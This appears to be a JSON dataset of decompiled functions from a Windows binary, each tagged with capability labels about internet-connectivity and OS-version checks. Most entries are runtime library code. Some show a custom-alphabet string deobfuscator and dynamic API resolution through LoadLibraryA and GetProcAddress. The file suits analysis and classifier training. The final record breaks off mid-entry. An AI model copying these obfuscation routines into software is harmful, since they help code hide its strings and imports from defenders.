{
    "14000102": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140001020(int64_t arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint64_t uVar6;\n    int64_t iVar8;\n    uchar auStack88 [32];\n    uchar auStack56 [16];\n    uchar auStack40 [16];\n    uint64_t uStack24;\n    uint64_t uVar7;\n    \n    uStack24 = *0x14001e010 ^ auStack88;\n    uVar6 = 0xffffffffffffffff;\n    do {\n        uVar7 = uVar6;\n        uVar6 = uVar7 + 1;\n    } while (*(arg1 + uVar6) != '\\0');\n    if (3 < uVar6) {\n        auStack56 = ZEXT816(0);\n        uVar4 = 0;\n        auStack40 = ZEXT816(0);\n        do {\n            uVar2 = 0;\n            do {\n                if (\"zcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr-JM2G7QAxpnmEVbqP5TuB9Ds6fFt\"[uVar2] == *(arg1 + uVar4))\n                goto code_r0x00014000108d;\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < 0x40);\n            if (uVar2 == 0x40) goto code_r0x00014000110b;\ncode_r0x00014000108d:\n            *(auStack56 + uVar4 * 8) = uVar2;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 4);\n        iVar3 = fcn.140004e5c(uVar6);\n        pcVar5 = arg1 + 4;\n        iVar8 = iVar3 - pcVar5;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5[iVar8] = cVar1;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = 0;\n        if (uVar7 != 3) {\n            do {\n                uVar4 = 0;\n                do {\n                    if (*(uVar6 + iVar3) == \"zcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr-JM2G7QAxpnmEVbqP5TuB9Ds6fFt\"[uVar4]) {\n                        *(uVar6 + iVar3) =\n                             \"zcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr-JM2G7QAxpnmEVbqP5TuB9Ds6fFt\"\n                             [uVar4 - *(auStack56 + (uVar6 & 3) * 8) & 0x3f];\n                        break;\n                    }\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < 0x40);\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < uVar7 - 3);\n        }\n    }\ncode_r0x00014000110b:\n    fcn.140001a50(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 755
    },
    "14000113": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140001130(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    int64_t *piVar8;\n    int64_t arg3;\n    uint64_t uVar9;\n    int64_t arg3_00;\n    \n    piVar8 = 0x140020450;\n    if (*0x140020450 == 0) {\n        return 0;\n    }\n    while( true ) {\n        iVar2 = piVar8[1];\n        piVar5 = piVar8 + 1;\n        if (iVar2 != 0) break;\ncode_r0x00014000117c:\n        piVar8 = piVar8 + 0x201;\n        if (*piVar8 == 0) {\n            return 0;\n        }\n    }\n    while (iVar1 = fcn.140004d78(iVar2, arg1),  iVar1 != 0) {\n        iVar2 = piVar5[2];\n        piVar5 = piVar5 + 2;\n        if (iVar2 == 0) goto code_r0x00014000117c;\n    }\n    if (piVar5[1] != 0) {\n        return piVar5[1];\n    }\n    iVar2 = *piVar8;\n    arg1_00 = fcn.140003558(*piVar5);\n    iVar2 = fcn.140003558(iVar2);\n    if (arg1_00 == 0) {\n        arg1_00 = iVar2;\n        if (iVar2 != 0) goto code_r0x0001400012c3;\n    }\n    else {\n        if (iVar2 != 0) {\n            iVar3 = fcn.140001020(arg1_00);\n            arg3 = -1;\n            if (iVar3 != 0) {\n                arg3_00 = -1;\n                do {\n                    arg3_00 = arg3_00 + 1;\n                } while (*(arg1_00 + arg3_00) != '\\0');\n                fcn.140003180(arg1_00, iVar3, arg3_00);\n                fcn.140004e48(iVar3);\n            }\n            iVar3 = fcn.140001020(iVar2);\n            if (iVar3 != 0) {\n                do {\n                    arg3 = arg3 + 1;\n                } while (*(arg3 + iVar2) != '\\0');\n                fcn.140003180(iVar2, iVar3, arg3);\n                fcn.140004e48(iVar3);\n            }\n            uVar6 = 0;\n            uVar4 = uVar6;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar2);\n                uVar7 = uVar4 + 1;\n                uVar4 = uVar7;\n                uVar9 = uVar6;\n                if (iVar3 != 0) goto code_r0x000140001280;\n                (*_sym.imp.KERNEL32.dll_Sleep)(100);\n            } while (uVar7 < 4);\n            goto code_r0x0001400012ca;\n        }\ncode_r0x0001400012c3:\n        fcn.140004e48(arg1_00);\n    }\n    uVar6 = 0;\n    goto code_r0x0001400012ca;\n    while ((*_sym.imp.KERNEL32.dll_Sleep)(100),  uVar9 = uVar7,  uVar7 < 4) {\ncode_r0x000140001280:\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, arg1_00);\n        uVar7 = uVar9 + 1;\n        if (uVar4 != 0) {\n            fcn.140004e48(arg1_00);\n            fcn.140004e48(iVar2);\n            uVar6 = uVar4;\n            break;\n        }\n    }\ncode_r0x0001400012ca:\n    piVar5[1] = uVar6;\n    return uVar6;\n}\n",
        "token_count": 945
    },
    "140003f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140003f30(uint8_t *arg1)\n\n{\n    uint8_t *arg4;\n    uint8_t *arg1_00;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint16_t uVar5;\n    uint *puVar6;\n    int16_t *piVar7;\n    uint64_t uVar8;\n    ulong arg2;\n    uchar *arg2_00;\n    uint32_t uVar9;\n    ushort uVar10;\n    int64_t arg3;\n    uchar auStack104 [32];\n    uint8_t *puStack72;\n    uint uStack56;\n    ushort uStack52;\n    uint64_t uStack48;\n    \n    uVar5 = *(arg1 + 0x42);\n    piVar7 = uVar5;\n    if (uVar5 != 0x46) {\n        if (uVar5 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x0001400040bf;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar5 == 0x49) {\n                piVar7 = *(arg1 + 0x18);\n                iVar1 = *piVar7;\n                if ((iVar1 == 0x33) && (piVar7[1] == 0x32)) {\n                    piVar7 = piVar7 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = piVar7;\n                }\n                else if ((iVar1 == 0x36) && (piVar7[1] == 0x34)) {\n                    piVar7 = piVar7 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = piVar7;\n                }\n                else {\n                    uVar5 = iVar1 - 0x58;\n                    piVar7 = uVar5;\n                    if ((uVar5 < 0x21) && (piVar7 = uVar5,  (0x120821001U >> (piVar7 & 0x3f) & 1) != 0)) {\n                        *(arg1 + 0x3c) = 9;\n                    }\n                }\n            }\n            else if (uVar5 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar5 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar5 == 0x68) {\n                    if (**(arg1 + 0x18) == 0x68) {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        piVar7 = 0x1;\n                    }\n                    else {\n                        piVar7 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar5 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x0001400040bf;\n                    }\n                    if (uVar5 != 0x6c) {\n                        if (uVar5 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar5 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar5 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x0001400040bf;\n                    }\n                    if (**(arg1 + 0x18) == 0x6c) {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        piVar7 = 0x4;\n                    }\n                    else {\n                        piVar7 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = piVar7;\n            }\ncode_r0x0001400040bf:\n            return CONCAT71(piVar7 >> 8, 1);\n        }\n        uStack48 = 0x140003f72;\n        puVar6 = fcn.1400073e0();\n        *puVar6 = 0x16;\n        uStack48 = 0x140003f7d;\n        uVar8 = fcn.1400072c0();\n        return uVar8 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x0001400040bf;\n    *(arg1 + 0x2c) = 7;\n    uStack48 = *0x14001e010 ^ &stack0xffffffffffffff98;\n    uVar5 = *(arg1 + 0x42);\n    uVar10 = 0x78;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x0001400041ef:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001400041f3:\n            arg2 = 10;\ncode_r0x0001400041fb:\n            cVar4 = fcn.1400046f4(arg1, arg2);\n        }\n        else {\n            if (uVar5 == 0x41) goto code_r0x000140004202;\n            if (uVar5 == 0x43) {\ncode_r0x00014000415b:\n                cVar4 = fcn.14000464c(arg1);\n            }\n            else {\n                if (uVar5 < 0x45) goto code_r0x000140004367;\n                if (uVar5 < 0x48) goto code_r0x000140004202;\n                if (uVar5 == 0x53) {\ncode_r0x0001400041ab:\n                    cVar4 = fcn.14000499c(arg1);\n                }\n                else {\n                    if (uVar5 == 0x58) goto code_r0x0001400041c0;\n                    if (uVar5 != 0x5a) {\n                        if (uVar5 != 0x61) {\n                            if (uVar5 != 99) goto code_r0x000140004367;\n                            goto code_r0x00014000415b;\n                        }\n                        goto code_r0x000140004202;\n                    }\n                    cVar4 = fcn.140004394(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if (0x67 < uVar5) {\n            if (uVar5 == 0x69) goto code_r0x0001400041ef;\n            if (uVar5 == 0x6e) {\n                cVar4 = fcn.1400048c0(arg1);\n                goto code_r0x000140004207;\n            }\n            if (uVar5 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                arg2 = 8;\n            }\n            else if (uVar5 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x0001400041c0:\n                arg2 = 0x10;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x0001400041ab;\n                if (uVar5 == 0x75) goto code_r0x0001400041f3;\n                if (uVar5 != 0x78) goto code_r0x000140004367;\n                arg2 = 0x10;\n            }\n            goto code_r0x0001400041fb;\n        }\ncode_r0x000140004202:\n        cVar4 = fcn.140004410(arg1);\n    }\ncode_r0x000140004207:\n    if ((cVar4 == '\\0') || (arg1[0x40] != 0)) goto code_r0x000140004367;\n    uVar2 = *(arg1 + 0x30);\n    uStack56 = 0;\n    uStack52 = 0;\n    arg3 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack56 = 0x20;\n                    arg3 = 1;\n                }\n                goto code_r0x00014000426c;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack56 = uVar5;\n        arg3 = 1;\n    }\ncode_r0x00014000426c:\n    iVar1 = *(arg1 + 0x42);\n    if (((iVar1 - 0x58U & 0xffdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&stack0xffffffffffffffc8 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&stack0xffffffffffffffca + arg3 * 2) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar9 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.140003a80(arg1_00, uVar2 & 0xffffff00 | 0x20, uVar9, arg4);\n    }\n    puStack72 = arg1 + 0x10;\n    arg2_00 = &stack0xffffffffffffffc8;\n    fcn.140004b50(arg1_00, arg2_00, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.140003a80(arg1_00, arg2_00 & 0xffffffffffffff00 | 0x30, uVar9, arg4);\n    }\n    uVar8 = 0;\n    fcn.140004a64(arg1);\n    if ((-1 < *(arg1 + 0x28)) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        fcn.140003a80(arg1_00, uVar8 & 0xffffffffffffff00 | 0x20, uVar9, arg1 + 0x28);\n    }\ncode_r0x000140004367:\n    uVar8 = fcn.140001a50(uStack48 ^ &stack0xffffffffffffff98);\n    return uVar8;\n}\n",
        "token_count": 2687
    },
    "1400040c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400040c8(int64_t arg1)\n\n{\n    int64_t arg4;\n    int64_t arg1_00;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint16_t uVar5;\n    ulong arg2;\n    uint *arg2_00;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    ushort uVar8;\n    int64_t arg3;\n    uchar auStack104 [32];\n    int64_t iStack72;\n    uint uStack56;\n    ushort uStack52;\n    uint64_t uStack48;\n    \n    uStack48 = *0x14001e010 ^ auStack104;\n    uVar5 = *(arg1 + 0x42);\n    uVar8 = 0x78;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x0001400041ef:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001400041f3:\n            arg2 = 10;\ncode_r0x0001400041fb:\n            cVar4 = fcn.1400046f4(arg1, arg2);\n        }\n        else {\n            if (uVar5 == 0x41) goto code_r0x000140004202;\n            if (uVar5 == 0x43) {\ncode_r0x00014000415b:\n                cVar4 = fcn.14000464c(arg1);\n            }\n            else {\n                if (uVar5 < 0x45) goto code_r0x000140004367;\n                if (uVar5 < 0x48) goto code_r0x000140004202;\n                if (uVar5 == 0x53) {\ncode_r0x0001400041ab:\n                    cVar4 = fcn.14000499c(arg1);\n                }\n                else {\n                    if (uVar5 == 0x58) goto code_r0x0001400041c0;\n                    if (uVar5 != 0x5a) {\n                        if (uVar5 != 0x61) {\n                            if (uVar5 != 99) goto code_r0x000140004367;\n                            goto code_r0x00014000415b;\n                        }\n                        goto code_r0x000140004202;\n                    }\n                    cVar4 = fcn.140004394(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if (0x67 < uVar5) {\n            if (uVar5 == 0x69) goto code_r0x0001400041ef;\n            if (uVar5 == 0x6e) {\n                cVar4 = fcn.1400048c0(arg1);\n                goto code_r0x000140004207;\n            }\n            if (uVar5 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                arg2 = 8;\n            }\n            else if (uVar5 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x0001400041c0:\n                arg2 = 0x10;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x0001400041ab;\n                if (uVar5 == 0x75) goto code_r0x0001400041f3;\n                if (uVar5 != 0x78) goto code_r0x000140004367;\n                arg2 = 0x10;\n            }\n            goto code_r0x0001400041fb;\n        }\ncode_r0x000140004202:\n        cVar4 = fcn.140004410(arg1);\n    }\ncode_r0x000140004207:\n    if ((cVar4 == '\\0') || (*(arg1 + 0x40) != '\\0')) goto code_r0x000140004367;\n    uVar2 = *(arg1 + 0x30);\n    uStack56 = 0;\n    uStack52 = 0;\n    arg3 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack56 = 0x20;\n                    arg3 = 1;\n                }\n                goto code_r0x00014000426c;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack56 = uVar5;\n        arg3 = 1;\n    }\ncode_r0x00014000426c:\n    iVar1 = *(arg1 + 0x42);\n    if (((iVar1 - 0x58U & 0xffdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&uStack56 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&uStack56 + arg3 * 2 + 2) = uVar8;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.140003a80(arg1_00, uVar2 & 0xffffff00 | 0x20, uVar7, arg4);\n    }\n    iStack72 = arg1 + 0x10;\n    arg2_00 = &uStack56;\n    fcn.140004b50(arg1_00, arg2_00, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.140003a80(arg1_00, arg2_00 & 0xffffffffffffff00 | 0x30, uVar7, arg4);\n    }\n    uVar6 = 0;\n    fcn.140004a64(arg1);\n    if ((-1 < *(arg1 + 0x28)) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        fcn.140003a80(arg1_00, uVar6 & 0xffffffffffffff00 | 0x20, uVar7, arg1 + 0x28);\n    }\ncode_r0x000140004367:\n    fcn.140001a50(uStack48 ^ auStack104);\n    return;\n}\n",
        "token_count": 1709
    },
    "1400046f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1400046f4(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    iVar3 = *(arg1 + 0x3c);\n    iVar5 = 8;\n    if (iVar3 < 6) {\n        if (iVar3 == 5) goto code_r0x000140004743;\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                iVar5 = 1;\n                goto code_r0x000140004743;\n            }\n            iVar3 = iVar3 + -2;\n            if (iVar3 == 0) {\n                iVar5 = 2;\n                goto code_r0x000140004743;\n            }\n            goto code_r0x000140004736;\n        }\n    }\n    else {\n        if (((iVar3 == 6) || (iVar3 == 7)) || (iVar3 = iVar3 + -9,  iVar3 == 0)) goto code_r0x000140004743;\ncode_r0x000140004736:\n        if (iVar3 != 1) {\n            if (iVar3 != 2) {\n                iVar5 = 0;\n            }\n            goto code_r0x000140004743;\n        }\n    }\n    iVar5 = 4;\ncode_r0x000140004743:\n    if (iVar5 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar5 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar5 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar5 != 8) {\n            puVar1 = fcn.1400073e0();\n            *puVar1 = 0x16;\n            uVar2 = fcn.1400072c0();\n            return uVar2 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar2 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 4 & 1) != 0) && (uVar2 < 0)) {\n        uVar2 = -uVar2;\n        uVar4 = uVar4 | 0x40;\n        *(arg1 + 0x30) = uVar4;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar4 & 0xfffffff7;\n        fcn.14000384c(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar2 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 1;\n    if (iVar5 == 8) {\n        fcn.1400039dc(arg1, uVar2, arg2);\n    }\n    else {\n        fcn.140003938(arg1, uVar2 & 0xffffffff, arg2);\n    }\n    uVar4 = *(arg1 + 0x30) >> 7;\n    uVar2 = uVar4;\n    if (((uVar4 & 1) != 0) && ((uVar2 = 0,  *(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != 0x30)))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -2;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar2 >> 8, 1);\n}\n",
        "token_count": 1188
    },
    "140004d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.140004d78(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int64_t iStack40;\n    int64_t iStack32;\n    char cStack16;\n    \n    if (*0x140038ee4 == 0) {\n        if ((arg1 != NULL) && (arg2 != NULL)) {\n            do {\n                uVar1 = *arg1;\n                uVar2 = *arg2;\n                uVar6 = uVar1 + 0x20;\n                if (0x19 < uVar1 - 0x41) {\n                    uVar6 = uVar1;\n                }\n                uVar5 = uVar2 + 0x20;\n                arg1 = arg1 + 1;\n                arg2 = arg2 + 1;\n                if (0x19 < uVar2 - 0x41) {\n                    uVar5 = uVar2;\n                }\n            } while ((uVar6 - uVar5 == 0) && (uVar6 != 0));\n            return uVar6 - uVar5;\n        }\n        puVar4 = fcn.1400073e0();\n        *puVar4 = 0x16;\n        fcn.1400072c0();\n        return 0x7fffffff;\n    }\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar4 = fcn.1400073e0();\n        *puVar4 = 0x16;\n        fcn.1400072c0();\n        iVar3 = 0x7fffffff;\n    }\n    else {\n        fcn.140003afc(&iStack40, 0);\n        do {\n            uVar1 = *arg1;\n            arg1 = arg1 + 1;\n            uVar1 = *(uVar1 + *(iStack32 + 0x110));\n            uVar2 = *arg2;\n            arg2 = arg2 + 1;\n            iVar3 = uVar1 - *(uVar2 + *(iStack32 + 0x110));\n            if (iVar3 != 0) break;\n        } while (uVar1 != 0);\n        if (cStack16 != '\\0') {\n            *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 571
    },
    "140005a2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400058c9)\n// WARNING: Removing unreachable block (ram,0x0001400058d6)\n// WARNING: Removing unreachable block (ram,0x0001400058e0)\n// WARNING: Removing unreachable block (ram,0x0001400058ef)\n// WARNING: Removing unreachable block (ram,0x0001400058fa)\n// WARNING: Removing unreachable block (ram,0x000140005903)\n// WARNING: Removing unreachable block (ram,0x00014000590c)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140005a28(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    uint *var_20h;\n    int32_t *var_bp_18h;\n    ulong *var_bp_10h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = auStackX16;\n    var_28h._0_1_ = 0;\n    var_bp_18h = aiStackX24;\n    var_bp_10h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.1400057a4(var_30h, &var_2ch + 4, &var_20h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.140005968(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "14000657": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140006574(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x1400123a0;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x140011240)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x1400124a0);\n    if (piVar3 == 0x1400124a0) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x1400123a0) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x140011240)(0);\n                }\n                bVar4 = piVar3 != 0x1400123a8;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 273
    },
    "14000a91": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.14000a918(void)\n\n{\n    char acStackX8 [8];\n    ulong var_18h_2;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_20h_2;\n    ulong *var_18h;\n    char *var_10h;\n    ulong *var_bp_8h;\n    \n    acStackX8[0] = '\\x01';\n    var_28h._0_4_ = 0;\n    var_18h = &var_28h;\n    var_20h._0_4_ = 0;\n    var_10h = acStackX8;\n    var_bp_8h = &var_20h;\n    var_20h_2._0_4_ = 8;\n    var_20h_2._4_4_ = 8;\n    fcn.14000a710(&var_18h_2, &var_20h_2 + 4, &var_18h, &var_20h_2);\n    if (acStackX8[0] != '\\0') {\n        var_20h._0_4_ = var_28h;\n    }\n    return var_20h;\n}\n",
        "token_count": 280
    },
    "14001031": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
